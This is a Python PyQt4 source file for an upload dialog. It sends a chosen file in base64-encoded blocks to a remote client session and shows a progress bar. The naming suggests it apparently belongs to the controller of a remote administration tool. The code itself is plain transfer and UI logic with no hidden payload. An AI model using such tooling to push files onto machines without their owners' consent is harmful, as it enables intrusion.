from PyQt4.QtGui import *
from PyQt4.QtCore import *
import os, time, base64
from upload_ui import Ui_Dialog

from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

class upload(QDialog, Ui_Dialog):
    def __init__(self, moderator, file_name, session_id, client, module_id):
        QWidget.__init__(self)
        self.setupUi(self)
        self.gui = QCoreApplication.processEvents
        self.moderator = moderator

        self.anim = QPropertyAnimation(self, 'windowOpacity')
        self.anim.setDuration(100)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.start()

        self.setWindowFlags(Qt.WindowSystemMenuHint | Qt.WindowTitleHint)

        self.closeButton.setHidden(True)
        self.cancelButton.setHidden(False)

        self.closeButton.clicked.connect(self.Close)
        self.cancelButton.clicked.connect(self.Cancel)

        name_of_file = str(file_name).split('\\')[-1].split('/')[-1]

        self.setWindowTitle(_('UPLOAD_TITLE') + ' ' + name_of_file)
        self.cancelButton.setText(_('CANCEL'))

        BLOCKSIZE = 4096
        SENT = 0
        if file_name and os.path.exists(file_name):
            SIZE = os.path.getsize(file_name)
            with open(file_name, 'rb') as _f:
                for block in iter(lambda: _f.read(BLOCKSIZE), ''):
                    payload = {
                        'file_name': name_of_file,
                        'raw_data': base64.b64encode(block)
                    }
                    self.moderator.send_msg(payload, 'uploadMode', session_id=session_id, _to=client, module_id=module_id)
                    SENT += BLOCKSIZE
                    self.progressBar.setValue(SENT*100/SIZE)
                    self.gui()
                    time.sleep(0.1)
            self.moderator.send_msg(name_of_file, 'finishUpload', session_id=session_id, _to=client, module_id=module_id)
            self.closeButton.setHidden(False)
            self.cancelButton.setHidden(True)
            self.accept()
            self.closeButton.click()

    def Close(self):
        self.accept()

    def Cancel(self):
        self.reject()

    def closeEvent(self, QCloseEvent):
        pass


def File(moderat, file, session_id, client, module_id):
    dialog = upload(moderat, file, session_id, client, module_id)
    result = dialog.show()
    return result == QDialog.Accepted
